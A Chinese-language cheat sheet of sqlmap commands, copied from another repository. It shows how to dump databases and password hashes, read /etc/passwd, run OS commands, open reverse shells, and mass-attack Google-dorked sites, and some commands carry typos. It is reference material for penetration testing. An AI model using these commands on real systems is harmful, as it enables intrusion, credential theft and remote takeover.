sqlmap工具
==========

sqlmap官网: https://github.com/sqlmapproject/sqlmap

sqlmap实例（摘抄自 https://github.com/LiveXY/elearning/blob/master/sqlmap%E5%B7%A5%E5%85%B7.md ）：

* 获取当前用户名称

    ```bash
    $sqlmap -u "http://url/news?id=1" --current-user
    ```

* 获取当前数据库名称

    ```bash
    $sqlmap -u "http://www.xxoo.com/news?id=1" --current-db
    ```

* 列表名

    ```bash
    $sqlmap -u "http://www.xxoo.com/news?id=1" --tables -D "db_name"
    ```

* 列字段

    ```bash
    $sqlmap -u "http://url/news?id=1" --columns -T "tablename" users-D "db_name" -v 0
    ````

* 获取字段内容

    ```bash
    $sqlmap -u "http://url/news?id=1" --dump -C "column_name" -T "table_name" -D "db_name" -v 0
    ```

*  smart智能 level 执行测试等级

    ```bash
    $sqlmap -u "http://url/news?id=1" --smart --level 3 --users
    ```

*  dbms 指定数据库类型

    ```bash
    $sqlmap -u "http://url/news?id=1" --dbms "Mysql" --users
    ```

* 列数据库用户

    ```bash
    $sqlmap -u "http://url/news?id=1" --users
    ```

* 列数据库

    ```bash
    $sqlmap -u "http://url/news?id=1" --dbs
    ```

* 数据库用户密码

    ```bash
    $sqlmap -u "http://url/news?id=1" --passwords
    ```

* 列出指定用户数据库密码

    ```bash
    $sqlmap -u "http://url/news?id=1" --passwords-U root -v 0
    ```

* 列出指定字段，列出20条

    ```bash
    $sqlmap -u "http://url/news?id=1"  --dump -C "password,user,id" -T "tablename" -D "db_name" --start 1 --stop 20
    ```

* 列出所有数据库所有表 

    ```bash
    $sqlmap -u "http://url/news?id=1" --dump-all -v 0
    ```

* 查看权限

    ```bash
    $sqlmap -u "http://url/news?id=1" --privileges
    ```

* 查看指定用户权限

    ```bash 
    $sqlmap -u "http://url/news?id=1" --privileges -U root
    ```

* 是否是数据库管理员 

    ```bash
    $sqlmap -u "http://url/news?id=1" --is-dba -v 1
    ```

* 枚举数据库用户角色  

    ```bash
    $sqlmap -u "http://url/news?id=1" --roles
    ```

* 导入用户自定义函数（获取系统权限！） 

    ```bash
    $sqlmap -u "http://url/news?id=1" --udf-inject
    ```

* 列出当前库所有表 

    ```bash
    $sqlmap -u "http://url/news?id=1" --dump-all --exclude-sysdbs -v 0
    ```

* union 查询表记录  

    ```bash
    $sqlmap -u "http://url/news?id=1" --union-cols
    ```

* cookie注入 

    ```bash
    $sqlmap -u "http://url/news?id=1" --cookie "COOKIE_VALUE"
    ```

* 获取banner信息 

    ```bash
    $sqlmap -u "http://url/news?id=1" -b
    ```

* post注入 

    ```bash
    $sqlmap -u "http://url/news?id=1" --data "id=3"
    ```

* 指纹判别数据库类型  

    ```bash
    $sqlmap -u "http://url/news?id=1" -v 1 -f
    ```

* 代理注入 

    ```bash
    $sqlmap -u "http://url/news?id=1" --proxy"http://127.0.0.1:8118"
    ```

* 指定关键词 

    ```bash
    $sqlmap -u "http://url/news?id=1" --string"STRING_ON_TRUE_PAGE"
    ```

* 执行指定sql命令 

    ```bash
    $sqlmap -u "http://url/news?id=1" --sql-shell
    ```

* Dump文件 

    ```bash 
    $sqlmap -u "http://url/news?id=1" --file /etc/passwd
    ```

* 执行系统命令 

    ```bash
    $sqlmap -u "http://url/news?id=1" --os-cmd=whoami
    ```

* 系统交互shell 

    ```bash
    $sqlmap -u "http://url/news?id=1" --os-shell
    ```

* 反弹shell  

    ```bash
    $sqlmap -u "http://url/news?id=1" --os-pwn
    ```

* 读取win系统注册表 

    ```bash
    $sqlmap -u "http://url/news?id=1" --reg-read
    ```

* 保存进度  

    ```bash
    $sqlmap -u "http://url/news?id=1" --dbs-o "sqlmap.log"
    ```

* 恢复已保存进度

    ```bash
    $ sqlmap -u "http://url/news?id=1" --dbs -o "sqlmap.log" --resume
    ```

* google搜索注入点自动 跑出所有字段攻击实例

    ```bash
    $sqlmap -g "google语法" --dump-all --batch 
    ```

* 带Cookie

    ```bash
    $sqlmap -u "http://url/news?id=1&Submit=Submit" --cookie="PHPSESSID=41aa833e6d0d28f489ff1ab5a7531406" --string="Surname" --dbms=mysql --users --password
    ```
